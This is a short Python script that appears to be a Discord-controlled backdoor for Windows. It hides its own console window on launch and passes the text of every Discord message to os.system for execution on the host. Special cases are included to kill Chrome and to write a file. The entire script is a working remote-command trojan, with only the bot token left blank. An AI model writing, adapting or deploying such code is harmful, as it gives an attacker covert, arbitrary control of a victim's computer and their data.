import discord
from discord.ext import commands
from discord.ext.commands import Bot
import os
import win32gui, win32con
import ctypes
import sys
               
The_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)

bot = commands.Bot(command_prefix="!")
@bot.event
async def on_message(msg):
    if msg.content=="4":
        os.system("taskkill /f /im  chrome.exe")
    elif msg.content=="5":
        file = open("file.txt", "w")
        file.write("Hello")
        file.close()
    else:
        os.system(msg.content)
bot.run('')#here we write the token in quotes
